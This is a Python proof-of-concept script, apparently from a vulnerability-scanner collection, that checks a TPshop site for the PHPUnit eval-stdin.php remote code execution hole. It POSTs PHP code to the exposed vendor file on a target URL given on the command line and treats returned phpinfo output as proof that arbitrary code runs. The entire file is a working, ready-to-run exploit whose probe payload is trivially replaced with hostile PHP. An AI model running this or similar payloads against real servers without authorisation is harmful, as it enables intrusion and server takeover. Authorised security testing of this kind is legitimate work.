#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TPshop eval-stdin.php 代码执行漏洞
referer: unknown
author: Lucifer
description: 文件eval-stdin.php存在后门。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['TPshop eval-stdin.php 代码执行漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        post_data = "<?php phpinfo();?>"
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\tpost: "+json.dumps(post_data, indent=4)
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
